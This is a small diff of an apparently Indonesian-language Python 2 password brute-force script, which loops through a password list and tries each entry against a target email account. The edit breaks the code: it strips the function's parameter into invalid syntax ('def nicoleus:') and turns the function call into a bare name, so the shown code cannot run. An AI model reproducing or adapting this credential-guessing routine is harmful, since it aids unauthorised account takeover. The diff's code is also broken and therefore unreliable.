@@ -116,7 +116,7 @@ def main():
         print " "
 	
 
-def nicoleus(nicoleus_password):
+def nicoleus:
   try:
  	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
@@ -148,7 +148,7 @@ def life():
 	password_nob = open(password_list, "r")
 	for nicoleus_password in password_nob:
 		password_nob = nicoleus_password.replace("\n","")
-		nicoleus(nicoleus_password)		
+		nicoleus  	
 
 def runn_noobs():
          global password_list
